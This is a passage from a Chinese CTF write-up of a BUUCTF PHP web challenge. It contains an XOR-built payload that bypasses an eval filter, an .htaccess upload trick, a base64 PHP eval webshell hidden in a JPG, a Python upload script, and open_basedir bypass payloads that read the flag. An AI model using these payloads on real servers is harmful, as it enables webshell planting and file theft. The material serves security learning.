所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得<code>a-z</code>中所有字符。<br>那如何获取<code>a</code>呢？<br>数组<code>Array</code>的第一个字母就是大写<code>A</code>，而且第4个字母是小写<code>a</code>。利用它可以同时拿到<code>a</code>和<code>A</code>，等于我们就可以拿到<code>a-z</code>和<code>A-Z</code>的所有字母了。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>，然后再取这个字符串的第一个字符就是<code>A</code>了，同理获取<code>a</code>。<br>还可以利用下面的方式来获取：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">B</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"HI!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= <span class="string">"?"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line">    $__();</span><br><span class="line">?</span><br></pre></td></tr></table></figure><blockquote><p>1、<code>$_++;</code>这行代码的意思是对变量名为<code>_</code>的变量进行自增操作，在PHP中未定义的变量默认值为<code>null</code>，<code>null==false==0</code>，我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字；<br>2、<code>$__=&quot;?&quot; ^ &quot;}&quot;;</code>对字符<code>?</code>和<code>}</code>进行异或运算，得到结果<code>B</code>赋给变量名为<code>__</code>的变量；<br>3、<code>$__();</code>通过上面的赋值操作，变量<code>$__</code>的值为<code>B</code>，所以这行可以看作是<code>B()</code>,在PHP中,这行代码表示调用函数<code>B</code>,所以执行结果为<code>HI!</code>,在PHP中，我们可以将字符串当作函数来处理。</p></blockquote><p>想要更深的了解，参考前面的链接。</p><h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p><strong>关于解析</strong><br>之前讲过一个借用<code>.user.ini</code>解析来上传小马的，这里再扩展一下：</p><blockquote><p>nginx的服务器，而且上传目录下有一个php文件，所以上传.user.ini<br>apache的服务器，应该上传.htaccess</p></blockquote><p><code>.user.ini</code>的已经讲过了，这里讲一下<code>.htaccess</code>：上传的时候不能用<code>GIF89a</code>等文件头去绕过<code>exif_imagetype</code>,因为这样虽然能上传成功，但<code>.htaccess</code>文件无法生效。这时有两个办法:</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure><p><code>#</code>在<code>.htaccess</code>是注释符，所以<code>.htaccess</code>文件可以生效。同时在<code>.htaccess</code>前添加<code>x00x00x8ax39x8ax39</code>(要在十六进制编辑器中添加，或者使用<code>python</code>的<code>bytes</code>类型)，这里<code>x00x00x8ax39x8ax39</code>是wbmp文件的文件头，<code>.htaccess</code>中以<code>0x00</code>开头的同样也是注释符，所以不会影响<code>.htaccess</code>。<br><strong>对&lt;?过滤的绕过</strong><br>对<code>&lt;?</code>绕过的一般可以借用<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>来绕过，但是当PHP的版本是<code>7</code>以上的时候，本方法不可用了，此时需要用另一种方法：<strong>可以通过编码进行绕过，如原来使用utf-8编码，如果shell中是用utf-16编码则可以Bypass</strong>。<br>在本题中的用法后面再讲。</p><h4 id="绕过open-basedir-disable-function"><a href="#绕过open-basedir-disable-function" class="headerlink" title="绕过open_basedir/disable_function"></a>绕过open_basedir/disable_function</h4><p><code>open_basedir</code>是<code>php.ini</code>中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。<br>假设<code>open_basedir=/home/wwwroot/home/web1/:/tmp/</code>，那么通过web1访问服务器的用户就无法获取服务器上除了<code>/home/wwwroot/home/web1/</code>和<code>/tmp/</code>这两个目录以外的文件。<br>注意用<code>open_basedir</code>指定的限制实际上是前缀，而不是目录名。举例来说: 若<code>open_basedir = /dir/user</code>, 那么目录<code>/dir/user</code>和<code>/dir/user1</code>都是可以访问的，所以如果要将访问限制在仅为指定的目录，注意<strong>用斜线结束路径名</strong>。<br>更多的可以参考<a href="https://xz.aliyun.com/t/4720">这里</a>。</p><h3 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h3><p>进入题目看到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，代码主要分为两部分：<code>get_the_flag()</code>和各种过滤的代码(主要是为了调用<code>get_the_flag()</code>)。<br>可以利用下面的代码fuzz一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[x00- 0-9A-Za-z'</span><span class="string">"`~_&amp;.,|=[x7F]+/i', chr($i))) &#123;</span></span><br><span class="line"><span class="string">        echo urlencode(chr($i)).' ';</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>获取到没有被ban的字符：</p><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">! # $ % ( ) * + - / : ; <span class="tag">&lt; &gt;</span> ? @ ] ^ </span><span class="template-variable">&#123; &#125;</span></span><br></pre></td></tr></table></figure><p>参考前面讲的拿webshell的三种方法，这里取反符号<code>~</code>直接被禁掉了，<code>自增</code>需要用到变量长度会很长,因此尝试使用<code>异或</code>，因为有长度的限制，所以可以去凑出类似<code>$_GET{x}();</code>然后传入<code>x=get_the_flag</code>调用函数。<br>利用下面的脚本来构造：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure><p>拿到payload：</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">?_=$&#123;<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe<span class="meta">%</span>fe^<span class="meta">%</span>a<span class="number">1</span><span class="meta">%</span>b<span class="number">9</span><span class="meta">%</span>bb<span class="meta">%</span>aa&#125;&#123;<span class="meta">%</span>fe&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>fe=get_the_flag</span><br></pre></td></tr></table></figure><p>再看<code>get_the_flag</code>的代码，发现是一个上传，从代码可以看出，对<code>ph</code>、<code>&lt;?</code>、文件的类型都做了判断。<br>那只能上传图片马了，但是还需要上传解析图片马的文件，该题的环境是<code>apache</code>，因此需要上传<code>.htaccess</code>，构造的方法前面也讲过了。<br>现在讲一下<code>.htaccess</code>构造的内容，这里将一句话进行base64编码，然后在<code>.htaccess</code>中利用php伪协议进行解码，内容如下：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">#def</span>ine <span class="attribute">width</span> <span class="number">1337</span></span><br><span class="line"><span class="number">#def</span>ine <span class="attribute">height</span> <span class="number">1337</span> </span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br></pre></td></tr></table></figure><p>shell.jpg内容：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/<span class="attribute">Pg</span>==</span><br></pre></td></tr></table></figure><p>参考大佬的一个完整的上传脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web72.png" alt=""><br>然后访问<code>?a=phpinfo();</code>发现存在<code>open_basedir</code>和<code>disable_functions</code>的限制，参考前面讲到的知识，构造最终payload：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web73.png" alt=""><br>找到flag文件<code>THis_Is_tHe_F14g</code>，然后构造payload拿flag：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web74.png" alt=""><br>偶然发现，其实这个题不去绕过<code>open_basedir</code>和<code>disable_functions</code>的限制，直接访问<code>phpinfo()</code>就有flag…<br><img src="http://www.ggb0n.cool/images/BUUCTF-web75.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刷题刷不停，继续刷！👾👾👾
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="BUU刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="Cookie攻击" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="RCE" scheme="http://ggb0n.cool/tags/RCE/"/>
    
      <category term="反序列化漏洞" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="文件上传" scheme="http://ggb0n.cool/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="INDA漏洞" scheme="http://ggb0n.cool/tags/INDA%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="HTTP请求伪造" scheme="http://ggb0n.cool/tags/HTTP%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    
      <category term="堆叠注入" scheme="http://ggb0n.cool/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
      <category term="PHP伪协议" scheme="http://ggb0n.cool/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="Python反序列化漏洞" scheme="http://ggb0n.cool/tags/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Unicode安全问题" scheme="http://ggb0n.cool/tags/Unicode%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
      <category term="JWT伪造" scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="薅羊毛逻辑漏洞" scheme="http://ggb0n.cool/tags/%E8%96%85%E7%BE%8A%E6%AF%9B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="SSTI模板注入" scheme="http://ggb0n.cool/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
      <category term="MD5强比较" scheme="http://ggb0n.cool/tags/MD5%E5%BC%BA%E6%AF%94%E8%BE%83/"/>
    
      <category term="无参数RCE" scheme="http://ggb0n.cool/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
    
      <category term="open-basedir绕过" scheme="http://ggb0n.cool/tags/open-basedir%E7%BB%95%E8%BF%87/"/>
    
      <category term="htaccess上传漏洞" scheme="http://ggb0n.cool/tags/htaccess%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="巧取webshell" scheme="http://ggb0n.cool/tags/%E5%B7%A7%E5%8F%96webshell/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
  </entry>
  
</feed>
